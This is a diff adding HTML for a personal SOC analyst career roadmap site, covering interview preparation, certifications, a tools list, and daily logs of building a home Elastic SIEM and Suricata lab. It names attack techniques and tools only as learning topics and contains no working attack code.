+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-orange">25</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">GitHub Portfolio + LinkedIn Polish</div>
+          <div class="phase-hdr-meta">Your portfolio is the resume now</div>
+          <div class="phase-tags"><span class="ptag o">Career</span><span class="ptag">GitHub</span><span class="ptag">LinkedIn</span><span class="ptag">Personal Brand</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Hiring managers Google you. Make sure what they find sells you. Most candidates skip this step — that's exactly why you shouldn't.</div>
+        <div class="steps-list">
+
+          <div class="step-item">
+            <div class="step-n sn-orange">1</div>
+            <div class="step-content">
+              <div class="step-title">Organize your GitHub portfolio repo</div>
+              <div class="step-desc">Create a top-level README on your profile and main lab repo. Include: short bio, certifications earned, lab architecture diagram, links to every incident report, vulnerability assessment, threat brief, and runbook. Pin your 6 strongest repos. Every commit you make is a hiring signal.</div>
+              <div class="step-tools"><span class="stool">GitHub</span><span class="stool">Markdown</span><span class="stool">Architecture Diagrams</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-orange">2</div>
+            <div class="step-content">
+              <div class="step-title">Optimize LinkedIn</div>
+              <div class="step-desc">Headline: role you want, not role you have ("Cybersecurity Analyst | SOC | Cloud Security"). About section: 2 paragraphs covering background, lab work, and target roles. Featured section: pin your roadmap site and best GitHub repo. Skills section: add every tool from your lab. Get 3 endorsements per skill from coworkers.</div>
+              <div class="step-tools"><span class="stool">LinkedIn</span><span class="stool">Personal Branding</span></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-orange">3</div>
+            <div class="step-content">
+              <div class="step-title">Build in public — post weekly</div>
+              <div class="step-desc">Share lab progress on LinkedIn every week. Format: "What I built this week" → screenshot → 2-3 sentence summary → link to GitHub. Recruiters source candidates from these posts. Consistency beats virality.</div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-orange">4</div>
+            <div class="step-content">
+              <div class="step-title">Tailor your resume per role type</div>
+              <div class="step-desc">Maintain 2-3 resume variants: SOC Analyst, Cybersecurity Analyst, Cloud Security. Each emphasizes different lab work. Include measurable outcomes: "Wrote 12 incident reports", "Detected 8 attack types", "Reduced X by Y%". Use Times New Roman, clean formatting, max 1 page.</div>
+            </div>
+          </div>
+
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>Polished GitHub portfolio. Optimized LinkedIn. Weekly content rhythm. 2-3 tailored resume variants ready.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 26 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-orange">26</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Interview Preparation</div>
+          <div class="phase-hdr-meta">Technical drills · STAR stories · lab walkthrough</div>
+          <div class="phase-tags"><span class="ptag o">Career</span><span class="ptag">Behavioral</span><span class="ptag">Technical</span><span class="ptag">STAR Method</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Most candidates lose offers in the interview, not the resume screen. These drills close the gap.</div>
+        <div class="steps-list">
+
+          <div class="step-item">
+            <div class="step-n sn-orange">1</div>
+            <div class="step-content">
+              <div class="step-title">Master 25 common SOC/cyber analyst technical questions</div>
+              <div class="step-desc">Practice answering out loud (record yourself):<br>
+              → Walk me through how you'd investigate a phishing email<br>
+              → How do you triage an alert in your SIEM?<br>
+              → Explain the kill chain and ATT&CK framework<br>
+              → How do you investigate suspicious PowerShell?<br>
+              → What's the difference between IDS and IPS?<br>
+              → How do you investigate lateral movement?<br>
+              → Walk through the TCP three-way handshake<br>
+              → How does Kerberos work? What's Kerberoasting?<br>
+              → How would you respond to a ransomware incident?<br>
+              → Difference between symmetric and asymmetric encryption<br>
+              Write 1-paragraph answers for all 25. Memorize the structure, not the words.</div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-orange">2</div>
+            <div class="step-content">
+              <div class="step-title">Prepare 5 STAR stories from your lab</div>
+              <div class="step-desc">Build behavioral answers using <strong>Situation → Task → Action → Result</strong>. Pull from your lab work:<br>
+              → "Tell me about a time you solved a tough problem" → Fleet IP routing bug<br>
+              → "Tell me about a time you learned something new fast" → Elastic SIEM stack<br>
+              → "Tell me about your home lab" → use your Interview Translation paragraphs<br>
+              → "Tell me about a time you wrote technical documentation" → your incident reports<br>
+              → "Tell me about a time you investigated something suspicious" → any Phase 2.5 investigation<br>
+              Practice each out loud until smooth.</div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-orange">3</div>
+            <div class="step-content">
+              <div class="step-title">Build a 5-minute lab walkthrough</div>
+              <div class="step-desc">Many SOC interviews ask you to share your screen and walk through your lab. Prepare a 5-minute live demo: open Kibana → show your dashboards → pull up a real investigation → explain the timeline → show the related GitHub report. Practice until you can do it without notes. <strong>This wins interviews.</strong></div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-orange">4</div>
+            <div class="step-content">
+              <div class="step-title">Prepare smart questions to ask them</div>
+              <div class="step-desc">Always have 5+ questions ready:<br>
+              → What does a typical week look like for an analyst on this team?<br>
+              → What SIEM and EDR do you use? What's your detection engineering process?<br>
+              → How does the team measure success for an L1 analyst in the first 90 days?<br>
+              → What's the path from L1 to L2 here, and how long does that usually take?<br>
+              → What's the team's relationship with engineering / IT / vulnerability management?<br>
+              Strong questions signal you're already thinking like a team member.</div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <div class="step-n sn-orange">5</div>
+            <div class="step-content">
+              <div class="step-title">Mock interview with someone in the field</div>
+              <div class="step-desc">Reach out on LinkedIn to 3 SOC analysts, mention your roadmap site, ask for a 20-minute mock interview. Most will say yes — analysts love helping people coming up. Real practice with real practitioners is irreplaceable.</div>
+            </div>
+          </div>
+
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>25 technical answers written. 5 STAR stories practiced. 5-minute lab demo polished. Questions to ask prepared. At least 1 mock interview completed.</div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<div class="divider"></div>
+
+
+  </div>
+</section>
+
+
+  </div>
+</section>
+
+<!-- CERTS -->
+<section id="certs">
+  <div class="eyebrow">02 — Certifications</div>
+  <h2 class="sec-title reveal">Which Certs Actually Matter</h2>
+  <p class="sec-sub reveal">Focus on these. In this order. Don't get distracted by expensive or irrelevant certs.</p>
+
+  <div class="certs-grid reveal">
+    <!-- EARNED -->
+    <div class="cert-card earned">
+      <div class="cert-top"><div class="cert-name cn-g">CompTIA Security+</div><span class="cbadge cb-earned">✓ EARNED</span></div>
+      <div class="cert-desc">The baseline for every SOC and security analyst role. Required on most job postings and a DoD 8570/8140 requirement for government and defense positions.</div>
+    </div>
+    <div class="cert-card earned">
+      <div class="cert-top"><div class="cert-name cn-g">CompTIA Network+</div><span class="cbadge cb-earned">✓ EARNED</span></div>
+      <div class="cert-desc">TCP/IP, DNS, VPNs, firewalls — the networking foundation you need to analyze alerts and investigate traffic in any SOC environment.</div>
+    </div>
+    <div class="cert-card earned">
+      <div class="cert-top"><div class="cert-name cn-g">CompTIA CySA+</div><span class="cbadge cb-earned">✓ EARNED</span></div>
+      <div class="cert-desc">The most SOC-specific CompTIA cert. Covers threat detection, SIEM analysis, incident response, and vulnerability management. Filtered for by MSSP ATS systems.</div>
+    </div>
+    <!-- IN PROGRESS -->
+    <div class="cert-card">
+      <div class="cert-top"><div class="cert-name cn-b">AWS Security Specialty</div><span class="cbadge cb-ip">IN PROGRESS</span></div>
+      <div class="cert-desc">The highest-level AWS security certification. Covers GuardDuty, CloudTrail, Security Hub, IAM, and cloud incident response. Major differentiator for cloud-adjacent SOC and security analyst roles.</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-top"><div class="cert-name cn-b">CompTIA A+</div><span class="cbadge cb-ip">WGU — IN PROGRESS</span></div>
+      <div class="cert-desc">Hardware, OS, troubleshooting, and IT operations fundamentals. Required as part of the WGU B.S. Cybersecurity &amp; Information Assurance degree program.</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-top"><div class="cert-name cn-b">CompTIA Linux+</div><span class="cbadge cb-ip">WGU — IN PROGRESS</span></div>
+      <div class="cert-desc">Linux administration, shell scripting, and security hardening on Linux systems. Critical for SOC work — most SIEM servers, EDR tools, and cloud workloads run Linux.</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-top"><div class="cert-name cn-b">CompTIA Data+</div><span class="cbadge cb-ip">WGU — IN PROGRESS</span></div>
+      <div class="cert-desc">Data analytics, visualization, and reporting fundamentals. Supports security data analysis, SIEM dashboard work, and threat intelligence reporting skills.</div>
+    </div>
+    <div class="cert-card">
+      <div class="cert-top"><div class="cert-name cn-b">CompTIA PenTest+</div><span class="cbadge cb-ip">WGU — IN PROGRESS</span></div>
+      <div class="cert-desc">Penetration testing methodology, vulnerability scanning, and ethical hacking. Understanding attacker techniques makes you a stronger defender — essential for L2 SOC and threat hunting roles.</div>
+    </div>
+    <!-- PLANNED -->
+    <div class="cert-card">
+      <div class="cert-top"><div class="cert-name cn-m">CCSP — (ISC)²</div><span class="cbadge cb-plan">LONG-TERM GOAL</span></div>
+      <div class="cert-desc">Certified Cloud Security Professional — the gold standard for cloud security engineering roles. Targets the $120K+ Cloud Security Engineer positions. Get this after 2+ years of cloud security experience.</div>
+    </div>
+    <div class="cert-card earned">
+      <div class="cert-top"><div class="cert-name cn-g">WGU BSCSIA</div><span class="cbadge cb-ip">JAN 2027</span></div>
+      <div class="cert-desc">Bachelor of Science in Cybersecurity and Information Assurance — Western Governors University. Includes 16 industry certifications built directly into the curriculum. ABET-accredited. NSA/DHS designated National Center of Academic Excellence in Cyber Defense.</div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- TOOLS SECTION -->
+<section id="tools">
+  <div class="eyebrow">03 — Tools</div>
+  <h2 class="sec-title reveal">Every Tool You Need</h2>
+  <p class="sec-sub reveal">Organized by cost. Most of what you need is free.</p>
+
+  <div class="reveal" style="margin-top:24px">
+    <div style="font-family:var(--mono);font-size:10px;color:var(--accent2);margin-bottom:10px;letter-spacing:.06em">FREE TOOLS</div>
+    <div class="tools-wrap">
+      <span class="tool-pill free">Elastic SIEM</span>
+      <span class="tool-pill free">Kibana</span>
+      <span class="tool-pill free">Sysmon</span>
+      <span class="tool-pill free">Suricata IDS</span>
+      <span class="tool-pill free">VirtualBox</span>
+      <span class="tool-pill free">UTM (Mac)</span>
+      <span class="tool-pill free">Kali Linux</span>
+      <span class="tool-pill free">Wireshark</span>
+      <span class="tool-pill free">Metasploit</span>
+      <span class="tool-pill free">Impacket</span>
+      <span class="tool-pill free">BloodHound</span>
+      <span class="tool-pill free">mimikatz</span>
+      <span class="tool-pill free">CrackMapExec</span>
+      <span class="tool-pill free">VirusTotal</span>
+      <span class="tool-pill free">AbuseIPDB</span>
+      <span class="tool-pill free">URLScan.io</span>
+      <span class="tool-pill free">Any.run</span>
+      <span class="tool-pill free">MalwareBazaar</span>
+      <span class="tool-pill free">Hybrid-Analysis</span>
+      <span class="tool-pill free">MXToolbox</span>
+      <span class="tool-pill free">CyberChef</span>
+      <span class="tool-pill free">Shodan (free tier)</span>
+      <span class="tool-pill free">ATT&CK Navigator</span>
+      <span class="tool-pill free">GitHub</span>
+      <span class="tool-pill free">TryHackMe (free tier)</span>
+      <span class="tool-pill free">LetsDefend (free tier)</span>
+      <span class="tool-pill free">CyberDefenders (free)</span>
+      <span class="tool-pill free">Shuffle SOAR</span>
+      <span class="tool-pill free">AWS Free Tier</span>
+      <span class="tool-pill free">Azure Free Tier</span>
+      <span class="tool-pill free">PEStudio</span>
+      <span class="tool-pill free">Python</span>
+      <span class="tool-pill free">VS Code</span>
+      <span class="tool-pill free">Sigma</span>
+    </div>
+  </div>
+
+  <div class="reveal" style="margin-top:20px">
+    <div style="font-family:var(--mono);font-size:10px;color:var(--accent3);margin-bottom:10px;letter-spacing:.06em">LOW COST ($10–50/mo or one-time)</div>
+    <div class="tools-wrap">
+      <span class="tool-pill paid">Splunk (free 500MB/day)</span>
+      <span class="tool-pill paid">LetsDefend Pro (~$30/mo)</span>
+      <span class="tool-pill paid">TryHackMe Premium (~$14/mo)</span>
+      <span class="tool-pill paid">Shodan (membership $69 one-time)</span>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- BUILD LOGS -->
+<section id="logs">
+  <div class="eyebrow">04 — Build Logs</div>
+  <h2 class="sec-title reveal">Daily Progress</h2>
+  <p class="sec-sub reveal">Real updates from my lab. Every day I work on this roadmap I post what I did, what worked, and what broke.</p>
+
+  <div class="logs-intro reveal">
+    <strong>WHY THIS MATTERS</strong><br><br>
+    Most people talk about cybersecurity careers. Few actually document the work. These logs are proof — every command run, every alert fired, every problem solved. If you're building your own lab, follow along and use these as a reference.
+  </div>
+
+  <div class="logs-stack reveal">
+
+    <!-- DAY 1 -->
+    <div class="log-card">
+      <div class="log-card-hdr" onclick="toggleLog(this)">
+        <div class="log-day">
+          <div class="log-day-label">Day</div>
+          <div class="log-day-num">01</div>
+        </div>
+        <div class="log-info">
+          <div class="log-date">May 18, 2026</div>
+          <div class="log-title">Lab Foundation + Elastic SIEM + Suricata IDS</div>
+          <div class="log-phases">
+            <span class="log-phase-tag done">✓ Phase 1 Complete</span>
+            <span class="log-phase-tag done">✓ Phase 2 Complete</span>
+          </div>
+        </div>
+        <div class="log-caret">▶</div>
+      </div>
+      <div class="log-body">
+        <div class="log-body-inner">
+
+          <div class="log-section">
+            <div class="log-section-title">Phase 1 — Lab Foundation</div>
+            <ul class="log-list">
+              <li>Built Ubuntu SIEM VM in Oracle VirtualBox</li>
+              <li>Configured dual networking — NAT adapter for internet, Host-Only adapter for lab traffic</li>
+              <li>Confirmed Windows host can reach Ubuntu VM</li>
+              <li>SIEM host-only IP locked in at <code>192.168.56.101</code></li>
+              <li>Troubleshot DNS resolution, package repos, and adapter behavior</li>
+            </ul>
+          </div>
+
+          <div class="log-section">
+            <div class="log-section-title">Phase 2 — Elastic SIEM + Suricata IDS</div>
+            <ul class="log-list">
+              <li>Installed Elasticsearch and Kibana on Ubuntu SIEM</li>
+              <li>Verified Elasticsearch running with <code>systemctl</code> and <code>curl</code></li>
+              <li>Bound Kibana to <code>0.0.0.0</code> for browser access from Windows host</li>
+              <li>Completed Kibana enrollment + setup at <code>http://192.168.56.101:5601</code></li>
+              <li>Installed Suricata IDS and <code>jq</code> for JSON parsing</li>
+              <li>Updated rule sets with <code>suricata-update</code></li>
+              <li>Identified interfaces: <code>enp0s8</code> (NAT) and <code>enp0s3</code> (Host-Only)</li>
+              <li>Wrote custom ICMP test rule in <code>/tmp/local.rules</code></li>
+              <li>Validated rule with <code>suricata -T</code></li>
+              <li>Confirmed packet visibility from Windows with <code>tcpdump</code></li>
+              <li>Generated alerts logged in <code>fast.log</code> and <code>eve.json</code></li>
+              <li>Custom signature firing: <code>SOC LAB ICMP TEST ALERT</code></li>
+            </ul>
+          </div>
+
+          <div class="log-section">
+            <div class="log-section-title">Up Next — Phase 3</div>
+            <ul class="log-list">
+              <li>Install Sysmon on Windows 10 VM with SwiftOnSecurity config</li>
+              <li>Connect Windows telemetry to Elastic via Fleet / Elastic Agent</li>
+              <li>Build first Kibana detection dashboards</li>
+            </ul>
+          </div>
+
+          <a href="https://github.com/mmajeed7864/soclab/blob/main/DAY-01-LAB-LOG.md" target="_blank" class="log-cta">Read full log on GitHub →</a>
+
+        </div>
+      </div>
+    </div>
+
+    <!-- DAY 2 -->
+    <div class="log-card">
+      <div class="log-card-hdr" onclick="toggleLog(this)">
+        <div class="log-day">
+          <div class="log-day-label">Day</div>
+          <div class="log-day-num">02</div>
+        </div>
+        <div class="log-info">
+          <div class="log-date">May 19, 2026</div>
+          <div class="log-title">Windows Telemetry, Sysmon, Fleet, and First SOC Dashboard</div>
+          <div class="log-phases">
+            <span class="log-phase-tag done">✓ Phase 2 Complete</span>
+            <span class="log-phase-tag">Windows + Fleet</span>
+            <span class="log-phase-tag">Kibana Dashboards</span>
+          </div>
+        </div>
+        <div class="log-caret">▶</div>
+      </div>
+      <div class="log-body">
+        <div class="log-body-inner">
+
+          <div class="log-section">
+            <div class="log-section-title">Windows 10 Victim VM + Sysmon</div>
+            <ul class="log-list">
+              <li>Built and configured Windows 10 victim VM in VirtualBox</li>
+              <li>Fixed VirtualBox networking — added both <code>Host-Only</code> and <code>NAT</code> adapters</li>
+              <li>Confirmed Windows-to-Ubuntu communication via ICMP</li>
+              <li>Installed Sysmon with the SwiftOnSecurity configuration</li>
+              <li>Verified Sysmon creating Windows Event Logs under <code>Microsoft-Windows-Sysmon/Operational</code></li>
+            </ul>
+          </div>
+
+          <div class="log-section">
+            <div class="log-section-title">Elastic Fleet + Agent Enrollment</div>
+            <ul class="log-list">
+              <li>Installed Fleet Server on the Ubuntu SIEM VM</li>
+              <li>Enrolled Windows 10 victim with Elastic Agent</li>
+              <li>Added the <strong>System integration</strong> for baseline Windows telemetry</li>
+              <li>Added a <strong>Custom Windows Event Logs integration</strong> targeting <code>Microsoft-Windows-Sysmon/Operational</code></li>
+              <li>Confirmed Windows/Sysmon logs ingesting into Elastic under the <code>winlog.winlog</code> dataset</li>
+            </ul>
+          </div>
+
+          <div class="log-section">
+            <div class="log-section-title">First SOC-Focused Kibana Dashboard</div>
+            <ul class="log-list">
+              <li>Sysmon event volume over time</li>
+              <li>Top Sysmon event codes</li>
+              <li>Top Sysmon processes</li>
+              <li>Top parent processes</li>
+              <li>Destination IP / network connection activity</li>
+            </ul>
+          </div>
+
+          <div class="log-section">
+            <div class="log-section-title">⚠ Issues Hit + How I Fixed Them</div>
+            <ul class="log-issues-list">
+              <li><strong>Kibana enrollment + auth failures</strong> — regenerated enrollment tokens via Elasticsearch API and re-ran setup carefully.</li>
+              <li><strong>VirtualBox clipboard/copy-paste broken</strong> — installed Guest Additions on Windows and switched to SSH into Ubuntu for command entry.</li>
+              <li><strong>Windows VM had no internet</strong> — only had Host-Only adapter. Added a NAT adapter while keeping Host-Only for lab traffic.</li>
+              <li><strong>Windows and Ubuntu could not ping each other</strong> — Windows network profile was set to <code>Public</code>, blocking ICMP. Switched the Host-Only interface to <code>Private</code> and added an inbound ICMP firewall rule.</li>
+              <li><strong>Fleet Server install failing on service token auth</strong> — generated a fresh Fleet Server service token via the Elasticsearch API, then reinstalled Fleet Server cleanly.</li>
+              <li><strong>Kibana alerting/Fleet errors due to missing encryption keys</strong> — generated Kibana encryption keys, added them to <code>kibana.yml</code>, restarted Kibana.</li>
+              <li><strong>Windows logs not showing in Discover even after enrollment</strong> — Fleet output was pointing to the Ubuntu <code>NAT IP</code> (<code>10.0.3.15</code>) instead of the stable Host-Only IP. Updated the managed Fleet Elasticsearch output to <code>https://192.168.56.101:9200</code>, restarted Kibana, restarted the Windows agent, and <code>winlog.winlog</code> data streams started flowing.</li>
+            </ul>
+          </div>
+
+          <div class="log-section">
+            <div class="log-section-title">Skills Sharpened</div>
+            <ul class="log-list">
+              <li>SIEM deployment + Fleet/Agent enrollment end-to-end</li>
+              <li>Sysmon configuration and Windows telemetry collection</li>
+              <li>Kibana dashboard authoring with SOC-relevant panels</li>
+              <li>VirtualBox dual-adapter networking + Windows firewall troubleshooting</li>
+              <li>Token/auth troubleshooting, service management, log pipeline validation</li>
+            </ul>
+          </div>
+
+          <div class="log-section">
+            <div class="log-section-title">Up Next — Phase 3</div>
+            <ul class="log-list">
+              <li>Build a full Active Directory domain on Windows Server</li>
+              <li>Simulate AD attacks from Kali — password spray, Kerberoasting, AS-REP Roasting, BloodHound, Pass-the-Hash, DCSync</li>
+              <li>Detect each attack in Kibana and map to MITRE ATT&CK</li>
+            </ul>
+          </div>
+
+          <a href="https://github.com/mmajeed7864/soclab/blob/main/DAY-02-LAB-LOG.md" target="_blank" class="log-cta">Read full log on GitHub →</a>
+
+        </div>
+      </div>
+    </div>
+
+    <!-- COMING SOON -->
+    <div class="log-coming-soon">
+      <div class="log-coming-soon-title">Day 03 Coming Soon</div>
+      <div class="log-coming-soon-text">Active Directory build + AD attack simulation + detection in Kibana</div>
+    </div>
+
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- TIMELINE / MY JOURNEY -->
+<section id="journey">
+  <div class="eyebrow">05 — My Journey</div>
+  <h2 class="sec-title reveal">Where I Am On This Path</h2>
+  <p class="sec-sub reveal">I'm following this same roadmap. Here's my timeline — so you can see it's achievable.</p>
+
+  <div class="tl reveal">
+    <div class="tl-item">
+      <div class="tl-col"><div class="tl-d done"></div><div class="tl-l"></div></div>
+      <div class="tl-body">
+        <div class="tl-date">2022 — 2024</div>
+        <div class="tl-title">IT Support Analyst — Apple IS&T HelpLine</div>
+        <div class="tl-desc">Enterprise IT support for Apple's internal infrastructure. Built foundation in systems, networking, and troubleshooting at scale.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-col"><div class="tl-d done"></div><div class="tl-l"></div></div>
+      <div class="tl-body">
+        <div class="tl-date">2024 — Present</div>
+        <div class="tl-title">Cloud & Network Operations — Bay Alarm</div>
+        <div class="tl-desc">Managing cloud and network infrastructure in production. Earned Security+, Network+, and CySA+ while working full-time. Currently pursuing AWS Security Specialty.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-col"><div class="tl-d done"></div><div class="tl-l"></div></div>
+      <div class="tl-body">
+        <div class="tl-date">Early 2026</div>
+        <div class="tl-title">Built first home SOC lab</div>
+        <div class="tl-desc">Deployed Elastic SIEM, Snort IDS, Sysmon, pfSense, and a virtualized Active Directory environment. Started generating real alerts and triaging them.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-col"><div class="tl-d now"></div><div class="tl-l"></div></div>
+      <div class="tl-body">
+        <div class="tl-date">May 2026 <span class="now-badge">RIGHT NOW</span></div>
+        <div class="tl-title">Expanding lab — working through this roadmap</div>
+        <div class="tl-desc">New lab machine set up. Starting the full 40-lab roadmap from Phase 1. Documenting everything publicly so others can follow the same path.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-col"><div class="tl-d future"></div><div class="tl-l"></div></div>
+      <div class="tl-body">
+        <div class="tl-date">End of 2026 — Target</div>
+        <div class="tl-title">SOC Analyst L1 or L2</div>
+        <div class="tl-desc">Complete the roadmap. Finish AWS Security Specialty. Build a GitHub portfolio of 20+ reports. Land an L1 or L2 SOC role at an MSSP or enterprise SOC in Charlotte or remote.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-col"><div class="tl-d future"></div></div>
+      <div class="tl-body">
+        <div class="tl-date">End of 2027 — Target</div>
+        <div class="tl-title">Cloud Security Engineer</div>
+        <div class="tl-desc">1 year of SOC experience + cloud certifications + Python and automation skills → pivot to Cloud Security Engineering. The destination this whole path is working toward.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CLOUD SALARY BOX -->
+  <div class="salary-box reveal">
+    <div class="salary-label">Why Cloud Security Engineering</div>
+    <div class="salary-role">Cloud Security Engineer — Average Salary</div>
+    <div class="salary-num">$147K</div>
+    <div class="salary-range">Range: $110,000 – $185,000+ annually</div>
+    <div class="salary-desc">The SOC analyst path isn't just about landing a security job — it's the foundation for cloud security engineering, where the combination of detection experience and cloud expertise commands top-of-market compensation.</div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- CTA -->
+<section>
+  <div class="cta-section reveal">
+    <div class="cta-title">Follow the journey.</div>
+    <div class="cta-sub">I update this roadmap as I learn. If you found it helpful, connect on LinkedIn — I post regular updates on labs, certs, and the job hunt.</div>
+    <div class="cta-btns">
+      <a href="https://www.linkedin.com/in/mohammed-majeed-40a661271" target="_blank" class="btn btn-primary">Connect on LinkedIn</a>
+      <a href="https://github.com/mmajeed7864" target="_blank" class="btn btn-ghost">GitHub Portfolio</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="footer-title">SOC Analyst Roadmap</div>
+  <div class="footer-sub">Built and maintained by Mohammed Al-Majeed · Charlotte, NC · Free forever</div>
+  <div class="footer-links">
+    <a href="https://www.linkedin.com/in/mohammed-majeed-40a661271" target="_blank" class="footer-link">LinkedIn</a>
+    <a href="https://github.com/mmajeed7864" target="_blank" class="footer-link">GitHub</a>
+    <a href="https://attack.mitre.org" target="_blank" class="footer-link">MITRE ATT&CK</a>
+    <a href="https://letsdefend.io" target="_blank" class="footer-link">LetsDefend</a>
+    <a href="https://cyberdefenders.org" target="_blank" class="footer-link">CyberDefenders</a>
+  </div>
+  <div class="footer-copy">Free to share. Free to use. // 2026</div>
+</footer>
+
+<script>
+function toggleLog(hdr){
+  const body=hdr.nextElementSibling;
+  const isOpen=body.classList.contains('open');
+  if(isOpen){body.classList.remove('open');hdr.classList.remove('open')}
+  else{body.classList.add('open');hdr.classList.add('open')}
+}
+
+function togglePhase(hdr){
+  const body=hdr.nextElementSibling;
+  const isOpen=body.classList.contains('open');
+  document.querySelectorAll('.phase-body').forEach(b=>b.classList.remove('open'));
+  document.querySelectorAll('.phase-hdr').forEach(h=>h.classList.remove('open'));
+  if(!isOpen){body.classList.add('open');hdr.classList.add('open')}
+}
+
+const obs=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{if(e.isIntersecting){e.target.classList.add('visible');obs.unobserve(e.target)}});
+},{threshold:.08});
+document.querySelectorAll('.reveal').forEach(r=>obs.observe(r));
+</script>
+</body>
+</html>
